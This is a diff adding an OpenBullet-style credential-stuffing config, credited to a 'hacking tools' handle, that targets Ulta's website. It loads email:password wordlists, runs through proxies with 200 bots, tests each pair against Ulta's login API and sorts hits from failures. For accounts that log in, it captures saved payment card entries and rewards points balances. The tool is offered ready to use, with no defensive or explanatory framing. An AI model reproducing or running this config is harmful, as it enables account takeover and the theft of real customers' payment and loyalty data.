@@ -1,0 +1,123 @@
+[SETTINGS]
+{
+  "Name": "Ulta(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-17T17:32:55.6823715+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.ulta.com/services/v1/session/token" 
+  
+  HEADER "Host: www.ulta.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: no-cache,no-store,must-revalidate,max-age=-1,private" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36" 
+  HEADER "Expires: -1" 
+  HEADER "Accept: */*" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.ulta.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" JSON "sessionConfirmationNumber" -> VAR "dyn_session_conf" 
+
+REQUEST POST "https://www.ulta.com/services/v5/user/login" 
+  CONTENT "{\"login\":\"<USER>\",\"password\":\"<PASS>\",\"autoLogin\":false,\"sourcePage\":\"default\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Origin: https://www.ulta.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "API-Access-Control: dyn_session_conf=<dyn_session_conf>" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.ulta.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Expires: -1" 
+  HEADER "Cache-Control: no-cache,no-store,must-revalidate,max-age=-1,private" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36" 
+  HEADER "Host: www.ulta.com" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Failure OR 
+    KEY "uccess\":fals" 
+
+REQUEST GET "https://www.ulta.com/myaccount/template.jsp?page=payment" 
+  
+  HEADER "Host: www.ulta.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.ulta.com/?source=account&originalURL=https%3A%2F%2Fwww.ulta.com%3A80%2Fulta%2Fmyaccount%2Ftemplate.jsp%3Fpage%3Dpayment&_requestid=4407683" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" LR "<a class=\"deletePopUp view-rewards mt20\" href=\"/myaccount/pages/creditCardDeletePopUp.jsp?param=" "\">Delete</a>" Recursive=TRUE CreateEmpty=FALSE -> CAP "cards" 
+
+REQUEST GET "https://www.ulta.com/myaccount/rewards_template.jsp?page=rewards" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "Points Balance:&nbsp;<span>" "</span></li>" CreateEmpty=FALSE -> CAP "Points" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
